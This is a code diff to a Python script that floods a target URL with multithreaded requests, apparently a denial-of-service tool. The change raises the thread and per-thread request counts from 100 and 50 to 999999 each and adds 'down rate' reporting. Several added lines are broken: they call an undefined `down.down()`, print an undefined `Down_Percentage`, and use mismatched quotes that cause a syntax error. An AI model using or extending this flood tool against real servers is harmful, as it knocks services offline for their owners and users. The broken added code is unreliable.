@@ -2,8 +2,8 @@ import threading,requests,random,string,time,sys,os
 
 # =================== CONFIG DEFAULTS ===================
 TARGET_URL = "https://127.0.0.1"
-THREADS = 100
-REQUESTS_PER_THREAD = 50
+THREADS = 999999
+REQUESTS_PER_THREAD = 999999
 DELAY = 0.001
 
 # =================== ARGUMENT INPUT ===================
@@ -56,6 +56,7 @@ success_count = 0
 fail_count = 0
 lock = threading.Lock()
 start_time = time.time()
+percentage_to_down = down.down()
 
 # =================== RANDOM PATH ===================
 def generate_random_path():
@@ -101,7 +102,8 @@ def monitor():
             print(f"❌ Failed: {fail_count}")
             print(f"📊 Success Rate: {success_rate:.2f}%")
             print(f"⚡ RPS (Requests/sec): {rps:.2f}")
-
+            print(f"📉 Succes Rate Of Was Down Time: {success_rate:.2f}%")
+            
 # =================== START ATTACK ===================
 def start_attack():
     threads = []
@@ -125,4 +127,5 @@ if __name__ == "__main__":
     print(f"Successful Requests: {success_count}")
     print(f"Failed Requests: {fail_count}")
     print(f"Total Time: {total_time:.2f} sec")
+    print(f'total Down Rate: {Down_Percentage:2f}%")
     
